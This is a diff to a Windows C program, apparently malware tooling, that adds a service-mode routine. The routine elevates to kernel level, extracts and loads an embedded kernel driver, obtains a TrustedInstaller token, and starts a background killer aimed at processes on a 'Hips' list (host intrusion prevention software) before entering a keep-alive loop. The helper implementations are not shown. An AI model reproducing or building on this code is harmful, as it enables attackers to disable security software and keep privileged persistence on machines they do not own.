@@ -74,6 +74,16 @@ static BOOL g_bSilent = FALSE;
 /** @brief 运行时释放的驱动文件路径（用于退出时清理） */
 static WCHAR g_DriverFile[MAX_PATH] = { 0 };
 
+/* ================================================================
+ * 前进声明 (供服务模式 SvcWorker 调用)
+ * ================================================================ */
+static int   ElevateToKernelLevel(void);
+static BOOL  ExtractEmbeddedDriver(WCHAR outPath[MAX_PATH]);
+static BOOL  LoadKernelDriver(LPCWSTR svc, LPCWSTR path);
+static void  PrintDriverLoadSummary(LPCWSTR svc, LPCWSTR dev);
+static BOOL  CreateProcessAsTrustedInstaller(LPCWSTR path, BOOL priv, LPCWSTR args);
+static void  StartBackgroundKiller(const char *list);
+
 /** @brief 后台进程查杀线程句柄 */
 static HANDLE g_hKillerThread = NULL;
 
@@ -498,6 +508,47 @@ static VOID WINAPI SvcCtrlHandler(DWORD ctrl) {
 static DWORD WINAPI SvcWorker(LPVOID param) {
     (void)param;
 
+    /* ★ 服务模式同样执行完整的提权与加载流程 ★ */
+    SetConsoleOutputCP(65001);
+    printf("========================================\n");
+    printf("  main_dual_new — 服务模式\n");
+    printf("  PID: %lu, 会话: %lu\n",
+           GetCurrentProcessId(), WTSGetActiveConsoleSessionId());
+    printf("========================================\n\n");
+
+    /* Phase 1: 权限检测（服务模式已是管理员） */
+    printf("[Phase 1/5] 权限检测...\n");
+    printf("[OK] 服务以 SYSTEM 身份运行\n\n");
+
+    /* Phase 2: 内核级权限提升 */
+    printf("[Phase 2/5] 内核级权限提升\n");
+    ElevateToKernelLevel();
+
+    /* Phase 2.5: 提取并加载内核驱动 */
+    printf("[Phase 2.5/5] 提取并加载内核驱动\n");
+    {
+        WCHAR driverPath[MAX_PATH];
+        if (ExtractEmbeddedDriver(driverPath)) {
+            LoadKernelDriver(g_DrvSvcName, driverPath);
+            g_hDriverDevice = CreateFileW(g_DrvDevicePath,
+                                           GENERIC_READ | GENERIC_WRITE,
+                                           0, NULL, OPEN_EXISTING, 0, NULL);
+        } else {
+            printf("[Driver] [FAIL] 无法获取驱动文件，跳过加载\n");
+        }
+    }
+    PrintDriverLoadSummary(g_DrvSvcName, g_DrvDeviceName);
+
+    /* Phase: TrustedInstaller 提权 */
+    CreateProcessAsTrustedInstaller(L"", FALSE, NULL);
+    if (!g_hTIToken) {
+        printf("[TI] TrustedInstaller 提权失败\n");
+    }
+
+    /* Phase: 启动后台内核级进程查杀 */
+    StartBackgroundKiller("Hips");
+
+    /* 进入保活主循环 */
     int restartCount = 0;
     RunBusinessCore(g_hSvcStopEvent, &restartCount,
                     "服务模式 (由 SCM 管理)");
